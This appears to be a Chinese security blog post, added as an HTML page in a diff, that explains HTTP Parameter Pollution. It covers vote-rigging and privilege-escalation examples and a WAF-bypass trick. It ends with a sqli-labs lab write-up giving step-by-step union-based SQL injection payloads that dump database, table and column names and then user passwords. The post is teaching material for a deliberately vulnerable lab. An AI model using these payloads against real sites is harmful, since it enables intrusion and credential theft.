@@ -1,0 +1,166 @@
+<!DOCTYPE HTML>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+<title>HTTP污染拙见</title>
+<meta name="author" content="John Doe">
+<!--[if IE]>
+  <meta http-equiv=refresh content='0, http://browsehappy.com'>
+<![endif]-->
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+<body oncontextmenu="return false">
+  <div class="aios_content">
+    <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
+    <div class="menu-bg">
+  <div class="menu-container">
+    <ul>
+      
+        <li class="menu-item">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives">Docs</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+<nav>
+  <a></a>
+</nav>
+
+    <div class="container" style="padding-bottom:40px">
+      <div class="row">
+  <div class="col-sm-12">
+    <header>
+  <div class="logo">
+    <h1 id="main-title" class="title"><a href="/">The clown is laughing at you</a></h1>
+  </div>
+</header>
+
+
+    <section class="main">
+      <div class="post">
+  <div class="post-header">
+    <h1 class="title">HTTP污染拙见</h1>
+    <div class="post-info">
+      <span class="date">2019-03-03</span>
+
+      
+    </div>
+  </div>
+
+  <div class="content">
+    <!-- Gallery -->
+    
+
+    <p>在重新学习sqlilab时看到HTTP污染，之前没有好好理解悔不当初啊。</p>
+<p>现在认真记录一下，重视基础<br>参考文章：<a href="https://blog.csdn.net/eatmilkboy/article/details/6761407" target="_blank" rel="noopener">https://blog.csdn.net/eatmilkboy/article/details/6761407</a></p>
+<h1 id="HTTP污染介绍"><a href="#HTTP污染介绍" class="headerlink" title="HTTP污染介绍"></a>HTTP污染介绍</h1><p>HPP是HTTP Parameter Pollution的缩写。这个漏洞由S. di Paola 与L. Caret Toni在2009年的OWASP上首次公布。这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击。如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。下面对这个漏洞的原理做一下详细解释。</p>
+<p>在跟服务器进行交互的过程中，客户端往往会在GET/POST请求里面带上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?par1=val1&amp;par2=val2 HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /foo HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 19</span><br></pre></td></tr></table></figure></p>
+<p>如上面的例子所示，这些参数会以名称-值对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。</p>
+<p><strong>重点来了</strong>：<br>对于不同的服务器，处理同名称但多参数情况的方式不一样，见下表：<br><img src="/2019/03/03/HTTP污染拙见/1.png" alt=""></p>
+<p>举个例子，虽然也是别人帖子上看的，但是能很好理解这个表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.google.com/search?q=italy&amp;q=china</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/03/HTTP污染拙见/2.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://search.yahoo.com/search?p=italy&amp;p=china</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/03/HTTP污染拙见/3.png" alt=""></p>
+<p>如果同时提供2个搜索的关键字参数给Google，那么Google会对2个参数都进行查询；但是Yahoo则不一样，它只会处理后面一个参数。</p>
+<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>现在举一个HPP漏洞的例子</p>
+<h2 id="对客户端的攻击"><a href="#对客户端的攻击" class="headerlink" title="对客户端的攻击"></a>对客户端的攻击</h2><p>假如有这么一个网站，用来给两个人投票<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Url : http:<span class="comment">//host/election.jsp?poll_id=4568</span></span><br><span class="line"> </span><br><span class="line">Link1: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang"</span>&gt;为张三投票&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">Link2: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=li"</span>&gt;为李四投票&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>而实现投票的链接为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID = Request.getParameter(<span class="string">"pool_id"</span>)</span><br><span class="line"> </span><br><span class="line">href_link = <span class="string">"vote.jsp?poll_id="</span> + ID + <span class="string">"&amp;candidate=xyz"</span></span><br></pre></td></tr></table></figure></p>
+<p>那么现在，攻击者恶意地生成如下的URL给投票人<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_://host/election.jsp?poll_id=4568%26candidate%3Dzhang</span><br></pre></td></tr></table></figure></p>
+<p>那么此后,实现投票的链接就为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href_link = <span class="string">"vote.jsp?poll_id="</span> + <span class="string">"4568&amp;26candidate=zhang"</span> + <span class="string">"&amp;candidate=xyz"</span></span><br></pre></td></tr></table></figure></p>
+<p>所以页面显示的内容就为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Url : http:<span class="comment">//host/election.jsp?poll_id=4568%26candidate%3Dzhang</span></span><br><span class="line"> </span><br><span class="line">Link1: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang&amp;candidate=zhang"</span>&gt;为张三投票&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">Link2: &lt;a href=<span class="string">"vote.jsp?poll_id=4568&amp;candidate=zhang&amp;candidate=li"</span>&gt;为李四投票&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>那我们可以知道jsp/Tomcat的web服务器，将会处理First参数，后一个不处理，然后这样便会出现最终都是给张三投票的情况。</p>
+<h2 id="对服务器端的攻击"><a href="#对服务器端的攻击" class="headerlink" title="对服务器端的攻击"></a>对服务器端的攻击</h2><p>某网站的实现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void <span class="keyword">private</span> executeBackendRequest(HTTPRequest request)&#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">String action=request.getParameter(<span class="string">"action"</span>);</span><br><span class="line"> </span><br><span class="line">String user=request.getParameter(<span class="string">"userid"</span>);</span><br><span class="line"> </span><br><span class="line">String target=request.getParameter(<span class="string">"target"</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HttpRequest(<span class="string">"http://centralauthencationserver/checkpriviledge.jsp"</span>, <span class="string">"POST"</span>,<span class="string">"action="</span>+action+<span class="string">"&amp;user="</span>+user+<span class="string">"&amp;target="</span>+target);&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* get feedback of whether this user has privilege to perform specified action. If no such privilege, return error, otherwise continue perform the action*/</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HttpRequest(<span class="string">"http://businessserver/performaction.php"</span>, <span class="string">"POST"</span>,<span class="string">"action="</span>+action+<span class="string">"&amp;user="</span>+user+<span class="string">"&amp;target="</span>+target);&#125;</span><br></pre></td></tr></table></figure></p>
+<p>它有个独立的集中认证服务器用来做用户权限方面的认证，另外的业务服务器专门用来处理业务，对外的门户实际上紧紧只是用来做请求的转发。这里不会有SQL注入之类的漏洞，因为不管是集中认证服务器还是业务处理服务器都会对传入的参数的格式做检查，确保不会存在SQL注入。那么哪儿有问题？因为集中认证服务器和业务处理服务器分别由2个团队开发，使用了不同的脚本语言，又没有考虑到HPP的情况。那么看看一个本来仅仅只是具有只读权限的用户，如果发送如下请求给服务器：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http_://frontHost/page?action=view&amp;userid=zhangsan&amp;target=bizreport&amp;action=edit</span><br></pre></td></tr></table></figure></p>
+<p>那么根据我们知道的Web服务器参数处理的方式，这个用户可以通过认证做一些本来没有权限做的事情。</p>
+<p>对于认证服务器，将会执行edit的功能。</p>
+<p>除此以外，HPP还可以被攻击者用来绕过一些Web应用防火墙(WAF, WebApp Firewall)，比如对某页面的SQL注入攻击如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_user.aspx?id=<span class="number">5</span>;select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>+from+users+where+id=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></p>
+<p>这个攻击因为在参数id里面存在明显的SQL注入的模板：select…from…而会被WAF成功拦截。但是如果换成HPP的方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_user.aspx?id=<span class="number">5</span>;select+<span class="number">1</span>&amp;id=<span class="number">2</span>&amp;id=<span class="number">3</span>+from+users+where+id=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></p>
+<p>这时候没有任何参数具备select…from…的特征，可能就可以绕过WAF的拦截了。</p>
+<h2 id="sqlilab-29"><a href="#sqlilab-29" class="headerlink" title="sqlilab-29"></a>sqlilab-29</h2><p>用28题作为例子<br>可以看到源码中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>如果在忽略WAF的情况下，我们注入将会发生如下情况：<br><img src="/2019/03/03/HTTP污染拙见/4.png" alt=""></p>
+<p>服务器端是由一个tomcat引擎的jsp服务器和一个apache引擎的php服务器组成的，我们发送的数据会先被jsp服务器接受，通过jsp服务器再传给php服务器，然后php服务器再把响应数据发给jsp服务器，最后由jsp服务器传给客户端</p>
+<p>在此jsp服务器起到WAF的作用，jsp会接受第一个参数，php服务器会接受最后一个参数<br>所以我们构造如下payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">'--+</span></span><br></pre></td></tr></table></figure></p>
+<p>成功了</p>
+<p>接下来一步一步来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">判读字段数：?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">' order by 3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断显示位：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --+</span><br><span class="line"></span><br><span class="line">爆出数据库名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,database(),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出表名：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">爆出字段名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users<span class="string">'--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出数据：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(username,<span class="string">"~"</span>,password,<span class="string">"~~~~"</span>),<span class="number">3</span> from users --+</span><br></pre></td></tr></table></figure></p>
+
+    <span class="date end-date">2019-03-03</span>
+  </div>
+
+  
+
+  
+</div>
+
+    </section>
+  </div>
+</div>
+
+    </div>
+  </div>
+  <footer class="footer-content">
+  <div class="container">
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+        <h2>About</h2>
+        <section>
+          Theme developed by <a href="//github.com/klugjo" target="_blank">Jonathan Klughertz</a><br>Contents created by <a href="//github.com/xaios" target="_blank">AIOS</a>
+        </section>
+      </div>
+      
+  <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+    <h2>New Contents</h2>
+    <ul>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/03/HTTP污染拙见/">HTTP污染拙见</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/03/01/mysql基本使用与用户管理/">mysql基本使用与用户管理</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/28/HTTP笔记/">HTTP笔记</a>
+        </li>
+      
+        <li>
+          <a class="footer-post" href="/2019/02/28/PHP中POST-GET/">PHP中POST&amp;&amp;GET</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+      
+
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <ul class="list-inline footer-social-icons"></ul>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="footer-copyright">@Untitled. All right reserved | Design & Hexo <a href="//www.codeblocq.com" target="_blank">Jonathan Klughertz</a></div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+</body>
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js"></script>
+<script src="/js/main.js"></script>
+
